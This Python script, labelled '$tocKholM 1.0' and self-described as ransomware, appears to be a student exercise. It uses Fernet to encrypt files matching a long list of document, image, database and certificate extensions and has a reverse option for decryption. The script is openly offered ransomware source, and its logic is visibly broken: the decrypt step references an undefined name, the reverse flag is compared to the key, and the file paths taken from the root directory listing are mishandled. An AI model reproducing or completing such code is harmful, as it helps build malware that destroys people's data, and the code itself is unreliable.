#Author: Javier Rodríguez.      .havit7.
import os
import re
import argparse
from cryptography.fernet import Fernet

def genera_clave():
    clave = Fernet.generate_key()
    with open("clave.key", "wb") as archivo_clave:
        archivo_clave.write(clave)

def cargar_clave():
    return open("clave.key", "rb").read()

def encript(nombre_archivo, clave):
    f = Fernet(clave)
    with open(nombre_archivo, "rb") as archivo:
        archivo_info = archivo.read()
    archivo_encriptado = f.encrypt(archivo_info)
    with open(nombre_archivo.split('.')[0] + ".ft", "wb") as archivo:
        archivo.write(archivo_encriptado)

def desencript(nombre_archivo, clave):
    f = Fernet(clave)
    with open(nombre_archivo, "rb") as archivo:
        archivo_encriptado = archivo.read()
    archivo_desencriptado = f.decrypt(archivo_encriptado)
    with open(nombre_archivo.split('.')[0] + ".ft", "wb") as archivo:
        archivo.write(archivo_desencriptado)

extensiones = ["odp", "odm", "odc", "odb", "doc", "docx", "docm", "wps", "xls", "xlsx", "xlsm", "xlsb", "xlk", "ppt", "pptx", "pptm", "mdb", "accdb", "pst", "dwg", "dxf", "dxg", "wpd", "rtf", "wb2", "mdf", "dbf", "psd", "pdd", "eps", "ai", "indd", "cdr", "dng", "3fr", "arw", "srf", "sr2", "bay", "crw", "cr2", "dcr", "kdc", "erf", "mef", "mrw", "nef", "nrw", "orf", "raf", "raw", "rwl", "rw2", "r3d", "ptx", "pef", "srw", "x3f", "der", "der", "cer", "crt", "pem", "pfx", "p12", "p7b", "p7c", "jpg", "jpeg", "png"]

parser = argparse.ArgumentParser(add_help=False)

parser.add_argument("-help", action="store_false")
parser.add_argument("-version", action="store_false")
parser.add_argument("-reverse", action="store_false")
parser.add_argument("-silent", action="store_false")

args = parser.parse_args()

if args.help == False:
    print('''Welcome to my Ran$omware...
___________________________
$tocKholM 1.0
Usage:  stockholm [-help -h] [-version -v] [-reverse -r] [-silent -s]

-help:      Print this help summary page.
-version:   Print version number.
-reverse:   Decrypt the files add the key afterwards.
-silent:    Does not show anything by output.''')
    exit()
if args.version == False:
    print("$tocKholM Versión 1.0")
    exit()

#genera_clave()
clave = cargar_clave()
directorios = os.listdir("/")

for a in directorios:
    if a.split('.')[1] in extensiones:
        encript(a, clave)
        if args.reverse == clave:
            desencript(nombre_archivo, clave)
        else:
            print("The key entered is not correct.")
            exit()
        if args.silent == True:
            print(f"Archivo {a} encriptado con éxito...")
